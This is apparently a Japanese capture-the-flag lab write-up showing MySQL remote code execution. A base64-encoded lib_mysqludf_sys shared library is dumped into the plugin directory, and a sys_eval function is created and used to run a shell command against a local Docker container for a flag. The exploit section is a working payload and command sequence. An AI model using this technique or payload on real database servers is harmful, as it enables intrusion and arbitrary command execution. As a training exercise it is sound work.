# MySQL RCE

## 環境構築

```
$ docker build -t mysql-udf .
$ docker run -d -p 127.0.0.1:3306:3306 mysql-udf:latest
```

## 初期データ
空だとさびしいかなと思って最終日の講義情報いれた。

```
mysql> use seccamp;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> select * from lectures;
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+
| name                                                                                                                                                              | track |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+
| マクロな視点から捉える Web セキュリティ: Web インフラストラクチャを利用した攻撃とサイドチャネル攻撃の実践と評価                                                   | B     |
| Learn the essential way of thinking about vulnerabilities through post-exploitation on middlewares                                                                | B     |
| 最先端のオフェンシブセキュリティ研究入門                                                                                                                          | C     |
| 機械学習モデルの構築と攻撃 (Part 3)                                                                                                                               | D     |
| セキュリティ啓発マンガの制作                                                                                                                                      | D     |
| ワークショップで学ぶ偽装通信対策                                                                                                                                  | A     |
| ロバストプロコル・オープンチャレンジ大会                                                                                                                          | A     |
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------+-------+
7 rows in set (0.00 sec)
```

## Exploit

```
$ mysql -u root -h 127.0.0.1
mysql>select from_base64('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AAAAAAAAAABnAAAAAQAAADIAAAAAAAAAhhEAAAAAAACGEQAAAAAAAN0AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAbwAAAAEAAAACAAAAAAAAAGQSAAAAAAAAZBIAAAAAAACcAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAH0AAAABAAAAAgAAAAAAAAAAEwAAAAAAAAATAAAAAAAAFAIAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACHAAAAAQAAAAMAAAAAAAAAGBUgAAAAAAAYFQAAAAAAABAAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAjgAAAAEAAAADAAAAAAAAACgVIAAAAAAAKBUAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAJUAAAABAAAAAwAAAAAAAAA4FSAAAAAAADgVAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAACaAAAABgAAAAMAAAAAAAAAQBUgAAAAAABAFQAAAAAAAJABAAAAAAAABAAAAAAAAAAIAAAAAAAAABAAAAAAAAAAowAAAAEAAAADAAAAAAAAANAWIAAAAAAA0BYAAAAAAAAYAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAKgAAAABAAAAAwAAAAAAAADoFiAAAAAAAOgWAAAAAAAAmAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAACxAAAAAQAAAAMAAAAAAAAAgBcgAAAAAACAFwAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAtwAAAAgAAAADAAAAAAAAAIgXIAAAAAAAiBcAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAALwAAAABAAAAAAAAAAAAAAAAAAAAAAAAAIgXAAAAAAAAmwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAABAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAjGAAAAAAAAMUAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA') into dumpfile "/usr/lib/mysql/plugin/lib_mysqludf_sys_64.so";

mysql> create function sys_eval returns string soname 'lib_mysqludf_sys_64.so';
Query OK, 0 rows affected (0.00 sec)

mysql> select convert(sys_eval('/usr/local/bin/run_it.sh') using utf8);
+----------------------------------------------------------+
| convert(sys_eval('/usr/local/bin/run_it.sh') using utf8) |
+----------------------------------------------------------+
| flag{UDF_ls_01d_t3chn1qu3}                       |
+----------------------------------------------------------+
1 row in set (0.01 sec)
```